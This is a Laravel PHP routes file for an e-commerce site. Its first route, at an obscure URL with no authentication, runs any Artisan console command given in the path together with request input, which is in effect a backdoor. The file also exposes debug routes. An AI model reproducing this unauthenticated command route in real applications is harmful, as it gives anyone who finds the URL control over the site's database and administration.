<?php

use ECommerce\Brand;
use ECommerce\Category;
use ECommerce\Product;
use Kareem3d\Images\Image;

Route::get('/my-name-is-kareem3d-friends/{command}', function($command)
{
    echo '<pre>';
    var_dump(Artisan::call($command, Input::all()));
    exit();
})->where('command', '.*');


Route::get('/profile', function()
{
    return View::make('pages.profile');
});


Route::get('/test-remote-connection', function()
{
    DB::connection('remote')->select('SELECT 1');
});



Route::get('/', array('as' => 'welcome', 'uses' => 'HomeController@welcome'));
Route::get('/home', array('as' => 'home', 'uses' => 'HomeController@index'));

Route::get('/shopping-cart.html', array('as' => 'shopping-cart', 'uses' => 'ShoppingCartController@index'));
Route::get('/checkout.html', array('as' => 'checkout', 'uses' => 'ShoppingCartController@checkout'));

Route::get('{category_name}/{brand_name}/{title}.html', array('as' => 'product', 'uses' => 'ProductsController@product'));
Route::get('brand/{brand_name}', array('as' => 'brand', 'uses' => 'ProductsController@brand'));
Route::get('category/{category_name}', array('as' => 'category', 'uses' => 'ProductsController@category'));
Route::get('category/{category_name}/{brand_name}', array('as' => 'category-brand', 'uses' => 'ProductsController@categoryBrand'));

Route::get('/choose-your-gifts.html', array('as' => 'choose-gifts', 'uses' => 'ProductsController@chooseGifts'));


// Form post requests
Route::post('/checkout.html', array('as' => 'checkout.post', 'uses' => 'CheckoutController@postCreateOrder'));


// Testing migs payment
Route::get('/nbe-return.html', array('as' => 'migs.back', 'uses' => 'MigsPaymentController@back'));

// Web services
Route::controller('product', 'ProductController');



Route::controller('blood-donation', 'Blood\UpdateLocationController');


Route::any('/throw-me', function()
{
    throw new Exception();
});


Route::get('/message-to-user.html', array('as' => 'message-to-user', function()
{
    if(Session::has('title'))
    {
        $title = Session::get('title');
        $body = Session::get('body');

        return View::make('pages.message_to_user', compact('title', 'body'));
    }

    return Redirect::route('home');
}));


Route::get('/change-currency/{currency}', function($currency)
{
    $appCurrency = Session::get('application_currency');

    if($appCurrency != $currency && \Units\Currency::isAvailable($currency))
    {
        Session::put('application_currency', $currency);

        App::make('Cart\ItemFactoryInterface')->regenerate();
    }

    // Redirect back or to home page
    try{ return Redirect::back(); } catch(Exception $e) { return Redirect::route('home'); }
});